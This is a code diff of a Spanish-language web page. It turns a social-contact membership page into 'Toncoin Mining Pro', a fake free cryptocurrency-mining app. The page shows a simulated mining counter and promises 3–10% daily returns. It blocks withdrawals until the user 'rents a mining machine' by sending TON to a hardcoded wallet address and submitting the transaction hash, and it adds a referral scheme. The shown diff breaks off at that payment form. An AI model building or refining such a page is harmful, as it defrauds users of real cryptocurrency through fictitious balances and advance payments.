@@ -3,854 +3,1064 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SocialLink - Conoce nuevas personas</title>
+    <title>Toncoin Mining Pro</title>
     <style>
-        /* Reset optimizado para móvil */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+            font-family: 'Arial', sans-serif;
         }
         
-        :root {
-            --primary: #25D366;
-            --secondary: #128C7E;
-            --dark: #075E54;
-            --light: #DCF8C6;
-            --white: #ffffff;
-            --gray: #f5f5f5;
-            --text: #333333;
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            --transition: all 0.2s ease;
-            --pink: #FF6B9E;
-            --blue: #4A90E2;
-            --purple: #9B59B6;
-            --gold: #FFD700;
-            font-size: 14px;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--gray);
-            color: var(--text);
-            line-height: 1.5;
-            -webkit-font-smoothing: antialiased;
+            background-color: #0f1014;
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s, color 0.3s;
         }
-
-        /* Header sticky */
-        header {
-            background: linear-gradient(135deg, var(--secondary), var(--dark));
-            color: var(--white);
-            padding: 1.2rem 1rem;
+        
+        body.light-mode {
+            background-color: #f5f5f5;
+            color: #333333;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
+            padding: 15px;
             text-align: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            font-weight: bold;
+            font-size: 1.2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
         }
-
-        .logo {
-            font-size: 1.6rem;
-            font-weight: 700;
-        }
-
-        .slogan {
-            font-size: 0.8rem;
-            opacity: 0.9;
-            margin-top: 0.3rem;
-        }
-
-        /* Contenedor principal */
-        .container {
-            padding: 1rem;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        /* Banner de membresía mejorado */
-        .membership-banner {
-            background: linear-gradient(135deg, #4e54c8, #8f94fb);
-            color: white;
-            border-radius: 12px;
-            padding: 1.2rem;
-            margin-bottom: 1.5rem;
-            box-shadow: var(--shadow);
+        
+        .theme-switch {
             position: relative;
-            overflow: hidden;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
         }
-
-        .membership-banner::before {
+        
+        .theme-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #1a1c23;
+            transition: .4s;
+            border-radius: 24px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background-color: #0088cc;
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        
+        .content {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+        
+        .counter {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+            color: #00ff9d;
+            text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
+        }
+        
+        .light-mode .counter {
+            color: #0088cc;
+            text-shadow: 0 0 10px rgba(0, 136, 204, 0.3);
+        }
+        
+        /* Animación de minería */
+        .mining-animation {
+            width: 150px;
+            height: 150px;
+            margin-bottom: 25px;
+            position: relative;
+            background: url('https://cryptologos.cc/logos/toncoin-ton-logo.png') center/contain no-repeat;
+            filter: drop-shadow(0 0 15px rgba(0, 255, 157, 0.5));
+            animation: pulse 2s infinite alternate;
+        }
+        
+        .mining-animation::before {
             content: "";
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0) 70%);
-            animation: pulse 8s infinite linear;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            border: 2px solid #00ff9d;
+            border-radius: 50%;
+            animation: rotate 6s linear infinite;
+            opacity: 0.5;
         }
-
+        
+        .mining-animation::after {
+            content: "";
+            position: absolute;
+            bottom: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 10px;
+            background: rgba(0, 255, 157, 0.3);
+            border-radius: 50%;
+            filter: blur(8px);
+            animation: pulseShadow 2s infinite alternate;
+        }
+        
         @keyframes pulse {
+            0% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(0, 255, 157, 0.5)); }
+            100% { transform: scale(1.05); filter: drop-shadow(0 0 20px rgba(0, 255, 157, 0.8)); }
+        }
+        
+        @keyframes rotate {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .membership-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            position: relative;
-            text-align: center;
-        }
-
-        .pricing-options {
-            display: flex;
-            justify-content: space-between;
-            gap: 0.8rem;
-            margin: 1rem 0;
-            flex-wrap: wrap;
-        }
-
-        .pricing-option {
-            background: rgba(255, 255, 255, 0.15);
-            border-radius: 10px;
-            padding: 0.8rem;
-            text-align: center;
-            flex: 1;
-            min-width: 100px;
-            position: relative;
-            transition: var(--transition);
-            cursor: pointer;
-        }
-
-        .pricing-option:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
-
-        .pricing-option.active {
-            background: rgba(255, 255, 255, 0.25);
-            border: 1px solid rgba(255,255,255,0.3);
-        }
-
-        .pricing-option.popular {
-            background: rgba(255, 215, 0, 0.2);
-            border: 1px solid var(--gold);
-        }
-
-        .price {
-            font-size: 1.4rem;
-            font-weight: 700;
-            color: var(--gold);
-        }
-
-        .price span {
-            font-size: 0.7rem;
-            display: block;
-            color: white;
-            opacity: 0.9;
-        }
-
-        .price-description {
-            font-size: 0.7rem;
-            margin-top: 0.3rem;
-        }
-
-        .popular-badge {
-            position: absolute;
-            top: -10px;
-            right: -10px;
-            background: var(--gold);
-            color: #000;
-            padding: 0.2rem 0.5rem;
-            border-radius: 20px;
-            font-size: 0.6rem;
-            font-weight: bold;
-        }
-
-        .plan-features-container {
-            padding: 0.8rem;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            margin: 0.5rem 0;
-            font-size: 0.75rem;
-            text-align: left;
-            animation: fadeIn 0.3s ease;
-            display: none;
-        }
-
-        .plan-features-container.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .membership-btn {
-            display: block;
-            width: 100%;
-            background: linear-gradient(to right, #25D366, #128C7E);
-            color: white;
-            text-align: center;
-            padding: 0.8rem;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 0.9rem;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            transition: var(--transition);
-            position: relative;
-            z-index: 1;
-            margin-top: 1rem;
-        }
-
-        .membership-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
-        }
-
-        .payment-methods {
-            margin-top: 1rem;
-            font-size: 0.7rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.8rem;
-            opacity: 0.9;
-            flex-wrap: wrap;
-        }
-
-        .payment-methods i {
-            font-size: 1.4rem;
-        }
-
-        /* Barra de búsqueda */
-        .search-container {
-            margin-bottom: 1.5rem;
-            position: relative;
-        }
-
-        .search-bar {
-            display: flex;
-            background: var(--white);
-            border-radius: 30px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-        }
-
-        .search-bar input {
-            flex: 1;
-            border: none;
-            padding: 0.8rem 1rem;
-            font-size: 0.9rem;
-            outline: none;
-        }
-
-        .search-bar button {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 0 1.2rem;
-            cursor: pointer;
-            transition: var(--transition);
-        }
-
-        .search-bar button:hover {
-            background: var(--secondary);
-        }
-
-        /* Filtros scrollables */
-        .filters {
-            display: flex;
-            overflow-x: auto;
-            padding: 0.8rem 0;
-            margin-bottom: 1rem;
-            gap: 0.6rem;
-            -webkit-overflow-scrolling: touch;
-            scrollbar-width: none;
+        
+        @keyframes pulseShadow {
+            0% { width: 80%; opacity: 0.3; }
+            100% { width: 90%; opacity: 0.6; }
         }
         
-        .filters::-webkit-scrollbar {
+        /* Botón de minería */
+        .mining-btn {
+            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 20px rgba(0, 255, 157, 0.4);
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .mining-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 255, 157, 0.6);
+        }
+        
+        .mining-btn:active {
+            transform: translateY(0);
+        }
+        
+        .mining-btn:disabled {
+            background: #2d2f3a;
+            color: #a0a0a0;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+        
+        .light-mode .mining-btn:disabled {
+            background: #d0d0d0;
+            color: #666666;
+        }
+        
+        .mining-status {
+            font-size: 1rem;
+            color: #00ff9d;
+            margin-bottom: 30px;
+            text-align: center;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(0, 255, 157, 0.3);
+        }
+        
+        .light-mode .mining-status {
+            color: #0088cc;
+            text-shadow: 0 0 5px rgba(0, 136, 204, 0.3);
+        }
+        
+        .mining-stats {
+            background: rgba(26, 28, 35, 0.7);
+            padding: 15px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(0, 255, 157, 0.2);
+        }
+        
+        .light-mode .mining-stats {
+            background: rgba(224, 224, 224, 0.7);
+            border: 1px solid rgba(0, 136, 204, 0.2);
+        }
+        
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .stat-row:last-child {
+            margin-bottom: 0;
+        }
+        
+        .stat-label {
+            color: #a0a0a0;
+        }
+        
+        .light-mode .stat-label {
+            color: #666666;
+        }
+        
+        .stat-value {
+            color: #00ff9d;
+            font-weight: bold;
+        }
+        
+        .light-mode .stat-value {
+            color: #0088cc;
+        }
+        
+        /* Navigation */
+        .navigation {
+            display: flex;
+            background-color: #1a1c23;
+            border-top: 1px solid #2d2f3a;
+        }
+        
+        .light-mode .navigation {
+            background-color: #e0e0e0;
+            border-top: 1px solid #d0d0d0;
+        }
+        
+        .nav-item {
+            flex: 1;
+            padding: 15px 0;
+            text-align: center;
+            color: #a0a0a0;
+            text-decoration: none;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+        
+        .light-mode .nav-item {
+            color: #666666;
+        }
+        
+        .nav-item.active {
+            color: #0088cc;
+        }
+        
+        .light-mode .nav-item.active {
+            color: #0088cc;
+        }
+        
+        .nav-item i {
+            display: block;
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+        }
+        
+        .hidden {
             display: none;
         }
-
-        .filter-btn {
-            background: var(--white);
-            border: none;
-            padding: 0.6rem 1rem;
-            border-radius: 20px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 0.8rem;
-            box-shadow: var(--shadow);
-            white-space: nowrap;
-            flex: 0 0 auto;
-            transition: var(--transition);
-        }
-
-        .filter-btn.active {
-            background: var(--primary);
-            color: var(--white);
-        }
-
-        /* Grid de usuarios - 2 columnas en móvil */
-        .users-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1rem;
-            padding-bottom: 1rem;
-        }
-
-        @media (min-width: 600px) {
-            .users-grid {
-                grid-template-columns: repeat(3, 1fr);
-            }
-        }
-
-        /* Tarjeta de usuario optimizada */
-        .user-card {
-            background: var(--white);
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-            position: relative;
-        }
-
-        /* Estilos para usuarios VIP */
-        .user-card.vip-user {
-            border: 2px solid var(--gold);
-        }
-
-        .user-card.vip-user .user-image::after {
-            content: "";
-            position: absolute;
+        
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,215,0,0.05));
-        }
-
-        .vip-badge {
-            position: absolute;
-            top: 0.5rem;
-            left: 0.5rem;
-            background: linear-gradient(135deg, var(--gold), #daa520);
-            color: #000;
-            padding: 0.2rem 0.6rem;
-            border-radius: 20px;
-            font-size: 0.6rem;
-            font-weight: bold;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            z-index: 2;
-        }
-
-        .user-image {
-            height: 0;
-            padding-bottom: 100%;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .user-image img {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: transform 0.3s ease;
-        }
-
-        .user-status {
-            position: absolute;
-            top: 0.5rem;
-            right: 0.5rem;
-            background: var(--primary);
-            color: var(--white);
-            padding: 0.15rem 0.5rem;
-            border-radius: 20px;
-            font-size: 0.6rem;
-            font-weight: 600;
-            z-index: 2;
-        }
-
-        .user-info {
-            padding: 0.8rem;
-            text-align: center;
-        }
-
-        .user-name {
-            font-size: 0.9rem;
-            font-weight: 600;
-            margin-bottom: 0.2rem;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            display: flex;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
             align-items: center;
-            justify-content: center;
         }
-
-        .verified {
-            color: var(--gold);
-            font-size: 0.8rem;
-            margin-left: 0.3rem;
-        }
-
-        .user-age {
-            display: inline-block;
-            background: var(--light);
-            color: var(--dark);
-            padding: 0.1rem 0.5rem;
+        
+        .modal-content {
+            background-color: #1a1c23;
+            padding: 20px;
             border-radius: 15px;
-            font-size: 0.65rem;
-            margin-bottom: 0.4rem;
+            width: 90%;
+            max-width: 350px;
+            border: 1px solid #2d2f3a;
+            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);
         }
-
-        .user-bio {
-            color: #666;
-            font-size: 0.75rem;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            margin-bottom: 0.6rem;
-            min-height: 2.4em;
-            line-height: 1.2;
+        
+        .light-mode .modal-content {
+            background-color: #ffffff;
+            border: 1px solid #d0d0d0;
         }
-
-        .user-interests {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.3rem;
-            justify-content: center;
-            margin-bottom: 0.8rem;
-        }
-
-        .interest-tag {
-            background: #f0f0f0;
-            color: #555;
-            padding: 0.15rem 0.5rem;
-            border-radius: 15px;
-            font-size: 0.6rem;
-            white-space: nowrap;
-        }
-
-        .whatsapp-btn {
-            display: block;
-            width: 100%;
-            background: linear-gradient(to right, var(--primary), var(--secondary));
-            color: var(--white);
+        
+        .modal-title {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            color: #0088cc;
             text-align: center;
-            padding: 0.5rem;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 0.75rem;
-            transition: var(--transition);
+            font-weight: bold;
         }
-
-        .whatsapp-btn i {
-            margin-right: 4px;
+        
+        .input-group {
+            margin-bottom: 15px;
         }
-
-        /* Botón Ver Más */
-        .load-more-btn {
+        
+        .input-group label {
             display: block;
-            width: 100%;
-            background: var(--white);
-            color: var(--dark);
-            border: none;
-            padding: 0.8rem;
-            border-radius: 8px;
-            font-weight: 600;
-            margin: 1rem auto;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-            max-width: 300px;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
         }
-
-        .load-more-btn:hover {
-            background: var(--primary);
-            color: var(--white);
+        
+        .light-mode .input-group label {
+            color: #333333;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #2d2f3a;
+            background-color: #0f1014;
+            color: white;
+            font-size: 1rem;
+        }
+        
+        .light-mode .input-group input {
+            border: 1px solid #d0d0d0;
+            background-color: #ffffff;
+            color: #333333;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .btn {
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            flex: 1;
+            transition: all 0.2s;
+        }
+        
+        .btn:hover {
             transform: translateY(-2px);
         }
-
-        @media (min-width: 600px) {
-            .load-more-btn {
-                display: none;
-            }
+        
+        .btn:active {
+            transform: translateY(0);
         }
-
-        /* Footer simplificado */
-        footer {
-            background: var(--dark);
-            color: var(--white);
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
+            color: white;
+            box-shadow: 0 2px 10px rgba(0, 255, 157, 0.3);
+        }
+        
+        .btn-secondary {
+            background-color: #2d2f3a;
+            color: white;
+        }
+        
+        .light-mode .btn-secondary {
+            background-color: #d0d0d0;
+            color: #333333;
+        }
+        
+        .error-message {
+            color: #ff5555;
+            font-size: 0.8rem;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .withdraw-btn {
+            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+            box-shadow: 0 2px 15px rgba(0, 255, 157, 0.3);
+            transition: all 0.2s;
+        }
+        
+        .withdraw-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(0, 255, 157, 0.4);
+        }
+        
+        /* Machines grid */
+        .machines-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .machine-card {
+            background: #1a1c23;
+            padding: 15px;
+            border-radius: 10px;
             text-align: center;
-            padding: 1.5rem 1rem;
-            margin-top: 1rem;
+            border: 1px solid rgba(0, 255, 157, 0.1);
+            transition: all 0.3s;
+        }
+        
+        .machine-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 255, 157, 0.2);
+            border-color: rgba(0, 255, 157, 0.3);
+        }
+        
+        .light-mode .machine-card {
+            background: #ffffff;
+            border: 1px solid #d0d0d0;
+        }
+        
+        .machine-name {
+            font-size: 1rem;
+            margin-bottom: 5px;
+            color: #0088cc;
+            font-weight: bold;
+        }
+        
+        .machine-profit {
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+            color: #00ff9d;
+        }
+        
+        .light-mode .machine-profit {
+            color: #0088cc;
+        }
+        
+        .machine-price {
+            font-size: 0.8rem;
+            margin-bottom: 10px;
+            color: #a0a0a0;
+        }
+        
+        .light-mode .machine-price {
+            color: #666666;
+        }
+        
+        .machine-btn {
+            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
+            color: white;
+            border: none;
+            padding: 10px 12px;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .machine-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 2px 10px rgba(0, 255, 157, 0.3);
+        }
+        
+        .machine-btn:disabled {
+            background: #2d2f3a;
+            color: #a0a0a0;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .light-mode .machine-btn:disabled {
+            background: #d0d0d0;
+            color: #999999;
+        }
+        
+        /* Payment address */
+        .payment-address {
+            background: #2d2f3a;
+            padding: 12px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-size: 0.8rem;
+            margin: 15px 0;
+            text-align: center;
+            cursor: pointer;
+            border: 1px dashed #00ff9d;
+            transition: all 0.2s;
+        }
+        
+        .payment-address:hover {
+            background: #3a3d45;
+        }
+        
+        .light-mode .payment-address {
+            background: #e0e0e0;
+            color: #333333;
+            border: 1px dashed #0088cc;
+        }
+        
+        .copy-message {
+            color: #00ff9d;
+            font-size: 0.7rem;
+            text-align: center;
+            margin-bottom: 10px;
+            display: none;
+        }
+        
+        .light-mode .copy-message {
+            color: #0088cc;
+        }
+        
+        /* Progress bar */
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            margin: 15px 0;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
             font-size: 0.8rem;
         }
-
-        /* Estados de usuario */
-        .online { background-color: var(--primary); }
-        .offline { background-color: #999; }
-        .busy { background-color: #E74C3C; }
-        .recent { background-color: var(--purple); }
-
-        /* Mejoras táctiles */
-        button, a {
-            touch-action: manipulation;
+        
+        .progress-bar {
+            height: 10px;
+            background-color: #2d2f3a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .light-mode .progress-bar {
+            background-color: #e0e0e0;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff9d 0%, #0088cc 100%);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.5s ease;
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
-    <header>
-        <h1 class="logo">Social Link</h1>
-      <p class="slogan">Conecta con personas increíbles sin importar donde vivan</p>
-    </header>
-
-    <div class="container">
-        <!-- Banner de membresía premium mejorado -->
-        <div class="membership-banner">
-            <h3 class="membership-title">¡ÚNETE A SOCIALLINK PREMIUM!</h3>
+    <div class="header">
+        <span>Toncoin Mining Pro</span>
+        <label class="theme-switch">
+            <input type="checkbox" id="theme-toggle">
+            <span class="slider"></span>
+        </label>
+    </div>
+    
+    <div class="content">
+        <!-- Home Section -->
+        <div id="home-section">
+            <div class="counter" id="ton-counter">0.000000</div>
+            <div class="mining-animation"></div>
+            <div class="mining-status" id="mining-status">MINERÍA INACTIVA</div>
+            <button class="mining-btn" id="mining-btn">COMENZAR MINERÍA GRATIS</button>
             
-            <div class="pricing-options">
-                <div class="pricing-option" data-plan="basic">
-                    <div class="price">$250 <span>CUP/MES</span></div>
-                    <div class="price-description">Plan Básico</div>
+            <div class="progress-container">
+                <div class="progress-label">
+                    <span>Progreso diario</span>
+                    <span id="progress-percent">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress" id="daily-progress"></div>
+                </div>
+            </div>
+            
+            <div class="mining-stats">
+                <div class="stat-row">
+                    <span class="stat-label">Velocidad:</span>
+                    <span class="stat-value" id="mining-speed">0.000011 TON/s</span>
+                </div>
+                <div class="stat-row">
+                    <span class="stat-label">Estimado diario:</span>
+                    <span class="stat-value">1.0 TON</span>
+                </div>
+                <div class="stat-row">
+                    <span class="stat-label">Total minado:</span>
+                    <span class="stat-value" id="total-mined">0.0 TON</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Wallet Section -->
+        <div id="wallet-section" class="hidden">
+            <h2 style="margin-bottom: 20px;">Tu Billetera</h2>
+            <div style="background: rgba(26, 28, 35, 0.7); padding: 20px; border-radius: 10px; width: 100%; max-width: 300px; border: 1px solid rgba(0, 255, 157, 0.2);">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                    <span>Balance:</span>
+                    <span id="wallet-balance">0.000000 TON</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                    <span>Invertido:</span>
+                    <span>0.000000 TON</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
+                    <span>Ganancias:</span>
+                    <span>0.000000 TON</span>
+                </div>
+                <button class="withdraw-btn" id="withdraw-btn">Retirar</button>
+            </div>
+        </div>
+        
+        <!-- Referrals Section -->
+        <div id="referrals-section" class="hidden">
+            <h2 style="margin-bottom: 20px;">Programa de Referidos</h2>
+            <div style="background: rgba(26, 28, 35, 0.7); padding: 20px; border-radius: 10px; width: 100%; max-width: 300px; border: 1px solid rgba(0, 255, 157, 0.2);">
+                <div style="margin-bottom: 15px; text-align: center;">
+                    <p>Invita a amigos y gana 5% de sus ganancias</p>
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <p style="font-size: 0.8rem; color: #a0a0a0;">Tu enlace de referido:</p>
+                    <div style="background: #2d2f3a; padding: 10px; border-radius: 5px; word-break: break-all; border: 1px dashed #00ff9d; cursor: pointer;" onclick="copyToClipboard('https://ton.investment/r/12345')">
+                        https://ton.investment/r/12345
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between;">
+                    <span>Referidos:</span>
+                    <span>0</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Machines Section -->
+        <div id="machines-section" class="hidden">
+            <h2 style="margin-bottom: 20px; text-align: center;">Máquinas de Minería</h2>
+            <div class="machines-grid">
+                <!-- Máquina Básica -->
+                <div class="machine-card">
+                    <div class="machine-name">Básica</div>
+                    <div class="machine-profit">3% diario</div>
+                    <div class="machine-price">1.0 TON</div>
+                    <button class="machine-btn" id="basic-machine-btn" onclick="showPaymentModal('Básica', 1.0)">Comprar</button>
                 </div>
                 
-                <div class="pricing-option popular" data-plan="annual">
-                    <div class="price">$1000 <span>CUP/AÑO</span></div>
-                    <div class="price-description">(Ahorra 16%)</div>
-                    <div class="popular-badge">POPULAR</div>
+                <!-- Máquina Normal -->
+                <div class="machine-card">
+                    <div class="machine-name">Normal</div>
+                    <div class="machine-profit">5% diario</div>
+                    <div class="machine-price">1.5 TON</div>
+                    <button class="machine-btn" id="normal-machine-btn" onclick="showPaymentModal('Normal', 1.5)">Comprar</button>
                 </div>
                 
-                <div class="pricing-option vip" data-plan="lifetime">
-                    <div class="price">$1800 <span>CUP/DE POR VIDA</span></div>
-                    <div class="price-description">Mejor oferta</div>
+                <!-- Máquina Avanzada -->
+                <div class="machine-card">
+                    <div class="machine-name">Avanzada</div>
+                    <div class="machine-profit">8% diario</div>
+                    <div class="machine-price">2.5 TON</div>
+                    <button class="machine-btn" id="advanced-machine-btn" onclick="showPaymentModal('Avanzada', 2.5)">Comprar</button>
                 </div>
+                
+                <!-- Máquina Premium -->
+                <div class="machine-card">
+                    <div class="machine-name">Premium</div>
+                    <div class="machine-profit">10% diario</div>
+                    <div class="machine-price">3.5 TON</div>
+                    <button class="machine-btn" id="premium-machine-btn" onclick="showPaymentModal('Premium', 3.5)">Comprar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Withdraw Modal -->
+    <div class="modal" id="withdraw-modal">
+        <div class="modal-content">
+            <div class="modal-title">Retirar TON</div>
+            
+            <div class="input-group">
+                <label for="withdraw-amount">Cantidad a retirar (mínimo 0.25 TON)</label>
+                <input type="number" id="withdraw-amount" placeholder="0.25" step="0.01" min="0.25">
+                <div class="error-message" id="amount-error">El monto mínimo es 0.25 TON</div>
             </div>
             
-            <!-- Contenedor nuevo para las características -->
-            <div class="plan-features-container">
-                <!-- Aquí se inyectará el contenido dinámico -->
+            <div class="input-group">
+                <label for="wallet-address">Dirección de tu Wallet TON</label>
+                <input type="text" id="wallet-address" placeholder="EQC...">
+                <div class="error-message" id="address-error">Por favor ingresa una dirección válida</div>
             </div>
             
-            <a href="https://wa.me/+14453032376?text=Estoy%20interesado%20en%20un%20plan%20de%20SocialLink" class="membership-btn">
-                <i class="fab fa-whatsapp"></i> OBTENER MEMBRESÍA
-            </a>
+            <div class="modal-buttons">
+                <button class="btn btn-secondary" id="cancel-withdraw">Cancelar</button>
+                <button class="btn btn-primary" id="confirm-withdraw">Retirar ahora</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Machine Required Modal -->
+    <div class="modal" id="machine-modal">
+        <div class="modal-content">
+            <div class="modal-title">Máquina Requerida</div>
+            <p style="margin-bottom: 20px; text-align: center;">Para evitar acciones fraudulentas y automatizadas, debes rentar una máquina de minería para poder realizar retiros.</p>
+            <div class="modal-buttons">
+                <button class="btn btn-secondary" id="close-machine-modal">Entendido</button>
+                <button class="btn btn-primary" id="go-to-machines">Ver Máquinas</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Payment Modal -->
+    <div class="modal" id="payment-modal">
+        <div class="modal-content">
+            <div class="modal-title" id="payment-title">Comprar Máquina</div>
             
-            <div class="payment-methods">
-                <span>Aceptamos:</span>
-                Transferencia CUP y Crypto
-                <i class="fab fa-bitcoin"></i>
+            <div style="text-align: center; margin-bottom: 15px;">
+                Por favor transfiere <span id="payment-amount" style="font-weight: bold; color: #00ff9d;">0.0</span> TON a la siguiente dirección:
+            </div>
+            
+            <div class="payment-address" id="ton-wallet-address" onclick="copyToClipboard('EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N')">
+                EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N
+            </div>
+            
+            <div class="copy-message" id="copy-message">
+                ¡Dirección copiada al portapapeles!
+            </div>
+            
+            <div class="input-group">
+                <label for="transaction-hash">Hash de la transacción:</label>
